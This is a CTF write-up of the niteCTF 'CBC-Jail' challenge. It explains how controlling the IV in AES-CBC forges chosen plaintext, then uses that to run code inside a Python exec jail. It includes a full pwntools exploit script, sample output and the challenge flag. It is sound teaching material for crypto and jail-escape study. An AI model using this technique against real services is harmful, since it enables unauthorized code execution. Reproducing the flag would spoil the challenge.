---
title: 'niteCTF - CBC-Jail'
date: 2021-12-13T01:00:00+00:00
author: Kris
layout: post
image: /images/2021/nitectf/cbctitle.png
categories:
  - Write-Ups
  - Pwn
  - Crypto
---
A unique combination of Python jailbreak and crypto flaw that had me learning a lot about AES-CBC mode. Super fun for me to get this solution working.

#### <a name="cbcjail"></a>CBC-Jail - Pwn - 457 points

This challenge reads:

```
crack() the jail to get the flag. But make sure you get your crypto
right.

nc cbc-jail.challenge.cryptonite.team 1337
```

The challenge comes with one `jail.py` which is the python source of the service running online. The code looks like this:

```python
#!/usr/bin/python3 -u

import os, base64, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY=os.urandom(16)
IV=os.urandom(16)

def encrypt(msg):
    msg = pad(msg,16)
    cipher = AES.new(KEY,AES.MODE_CBC,IV)
    encrypted = cipher.encrypt(msg)
    encrypted = encrypted.hex()
    msg = IV.hex() + encrypted
    return msg

def decrypt(msg,iv):
    if len(msg) > 16:
        print("Message must be <= 16")
    cipher = AES.new(KEY,AES.MODE_CBC,iv)
    decrypted = unpad(cipher.decrypt(msg),16).decode()
    return decrypted

def weirdify(inp):
    iv = bytes.fromhex(inp[:32])
    msg = bytes.fromhex(inp[32:])
    command = decrypt(msg,iv)
    return command

banned = ['_', 'import','.','flag']

def crack():
  REDACTED

print('Welcome to Prison.')
print('A mad cryptographer thought it would be cool to mess your shell up.')
print('Lets see if you can "crack()" your way out of here')
print("As a gift we'll give you a sample encryption")
print(encrypt(b'trapped_forever'))

while True:
    try:
        inp = input(">>")
        inp = weirdify(inp)
        for w in banned:
            if w in inp:
                print("GOTTEM!!")
                sys.exit(0)
        exec(inp)
    except KeyboardInterrupt:
        print('\n')
        sys.exit(0)
```

I usually hate AES challenges and usually switch right off but a work colleague of mine let me know that the cryptography flaw here is quite an easy one to exploit.

The critical thing he taught me is that if we have a ciphertext sample of a known plaintext and we have control of the IV that we send back to the server to decrypt then we can control the output of the first 16 bytes of decryption that the server does, without knowing the key at all.

When we connect to this server this is what we see:

```shell
Welcome to Prison.
A mad cryptographer thought it would be cool to mess your shell up.
Lets see if you can "crack()" your way out of here
As a gift we'll give you a sample encryption
5b18587e57f14b8579742b884a9ea536869bc237534325b0a7e7d36e517c9ebb
>>

```

This long hex string is the AES-CBC ciphertext of the string `trapped_forever` as well as the AES-CBC initialization vector used to create it. That we're receiving the IV is normal, in AES the IV should not be considered a secret. So the string breaks down like this:

- `IV = 5b18587e57f14b8579742b884a9ea536`
- `E('trapped_forever') = 869bc237534325b0a7e7d36e517c9ebb`

If we send this string back to the server the server decrypts it and ends up with the string `trapped_forever`. It then throws an error. 

```shell
Welcome to Prison.
A mad cryptographer thought it would be cool to mess your shell up.
Lets see if you can "crack()" your way out of here
As a gift we'll give you a sample encryption
5b18587e57f14b8579742b884a9ea536869bc237534325b0a7e7d36e517c9ebb
>>5b18587e57f14b8579742b884a9ea536869bc237534325b0a7e7d36e517c9ebb
GOTTEM!!
```

This is because the string contains one of the banned characters:

- `banned = ['_', 'import','.','flag']`

So in this way, its a Python jail where we must send AES encrypted payloads which decrypt to valid Python. 

Oh and we only have 16 bytes for our Python payload...

Oh and it cannot contain `_`, `import`, `.` or `flag`...

#### Solving the Crypto Problem First

As I mentioned earlier, I learned that controlling the IV means we control what the ciphertext decrypts to. But how?

It's a matter of:

1. `target = desired_payload XOR known_plaintext `

2. `new_iv = IV XOR target`



We test it quickly with a quick hello world to see it working:

```python
from pwn import *
from Crypto.Util.Padding import pad

local = True

host, port = "jail-crypto.challenge.cryptonite.team", 1337

if local:
    p = process('python jail.py', shell=True)
else:
    p = remote(host,port)

p.recvuntil(b'sample encryption\n')
sample = p.recvline()

iv = unhex(sample[:32])
ct = unhex(sample[32:])
pt = b'trapped_forever'

log.info(f'got iv: {enhex(iv)}')
log.info(f'got ct: {enhex(ct)}')
log.info(f'got pt: {enhex(pt)}')

pt = pad(pt, 16)
pl = pad(b'print("hello")', 16)

log.info(f'sending: {pl}')
res = p.recvuntil(b'>>')
target = xor(pt, pl)
new_iv = xor(target, iv)

final_payload = enhex(new_iv) + enhex(ct)  
p.sendline(final_payload.encode())
p.interactive()

```

Running it we see a successful `hello` message printed out:

```shell
$ python helloworld.py 
[+] Starting local process '/bin/sh': pid 379634
[*] got iv: 2d9563e81f33b3501e1e362e0f6fb173
[*] got ct: 2a835fcae4c11657a7b6ddae5a6e8ed1
[*] got pt: 747261707065645f666f7265766572
[*] sending: b'print("hello")\x02\x02'
[*] Switching to interactive mode
hello
>>
```

But how do we get a useful code execution (or file read) payload in just 16 bytes?

Well actually the service is stateful it seems and sending multiple additive payloads is possible:

```python
...
pt = pad(pt, 16)

payloads = ['a="hi"', 'a+=", how "', 'a+="are u?"', 'print(a)']

for pl in payloads:
    pl = pad(pl.encode(), 16)
    log.info(f'sending: {pl}')
    res = p.recvuntil(b'>>')
    target = xor(pt, pl)
    new_iv = xor(target, iv)

    final_payload = enhex(new_iv) + enhex(ct)  
    p.sendline(final_payload.encode())
p.interactive()
```

This gives us:

```shell
$ python ./additive.py 
[+] Starting local process '/bin/sh': pid 379815
[*] got iv: 5b6fa63a8f872b9c8b188b1faef4f2e8
[*] got ct: 276f22f7c72ce9a37fc1810a1fdbc6f4
[*] got pt: 747261707065645f666f7265766572
[*] sending: b'a="hi"\n\n\n\n\n\n\n\n\n\n'
[*] sending: b'a+=", how "\x05\x05\x05\x05\x05'
[*] sending: b'a+="are u?"\x05\x05\x05\x05\x05'
[*] sending: b'print(a)\x08\x08\x08\x08\x08\x08\x08\x08'
[*] Switching to interactive mode
hi, how are u?
>>
```

Since we can build additive payloads and we can just encode payloads, we should be able to build a string in memory that does whatever we want. I start with something simple like `os.system("ls -la")` since `os` is already imported in the `jail.py` I don't need to import it myself. The code looks like this:

```python
#!/usr/bin/python3

from pwn import *
from Crypto.Util.Padding import pad

local = True

host, port = "jail-crypto.challenge.cryptonite.team", 1337

if local:
    p = process('python jail.py', shell=True)
else:
    p = remote(host,port)

p.recvuntil(b'sample encryption\n')
sample = p.recvline()

iv = unhex(sample[:32])
ct = unhex(sample[32:])
pt = b'trapped_forever'

log.info(f'got iv: {enhex(iv)}')
log.info(f'got ct: {enhex(ct)}')
log.info(f'got pt: {enhex(pt)}')

pt = pad(pt, 16)

def encpayload(s):
    hexed = enhex(s)
    encoded = '|\\x'.join([hexed[x:x+2] for x in range(0, len(hexed), 2)]).split('|')
    parts = [f"a='\\x{encoded[0]}'"]
    for i, p in enumerate(encoded[1:]):
        parts.append(f"a+='{p}'")
    
    return parts

# any payload will do, we can keep appending anything to variable
payload_list = encpayload(b'os.system("ls -la")')
payload_list.append('print(a)')
payload_list.append('exec(a)') 

for pl in payload_list:
    res = p.recvuntil(b'>>')

    pl = pad(pl.strip().encode(), 16)
    
    target = xor(pt, pl)
    new_iv = xor(target, iv)

    final_payload = enhex(new_iv) + enhex(ct)  
    p.sendline(final_payload.encode())

p.interactive()
```

And trying it on the remote target immediately gave us the flag!

```shell
$ ./solve.py 
[+] Opening connection to jail-crypto.challenge.cryptonite.team on port 1337: Done
[*] got iv: 7f3468ee6bec6395f9a6a96eaf078612
[*] got ct: c67bd34273a2f25477432de5590fcad2
[*] got pt: 747261707065645f666f7265766572
os.system("ls -la")
total 16
drwxr-xr-x 2 nobody nogroup 4096 Dec 10 13:44 .
drwxr-xr-x 3 nobody nogroup 4096 Dec 10 13:44 ..
-rw-r--r-- 1 nobody nogroup   18 Dec  6 13:08 flag.txt
-rw-r--r-- 1 nobody nogroup    0 Dec  6 13:08 nite{Th3__gr3at_esc4p3}
-rwxr-xr-x 1 nobody nogroup 1387 Dec  6 13:08 server.py
>>
```

Learned something pretty valuable about AES today!
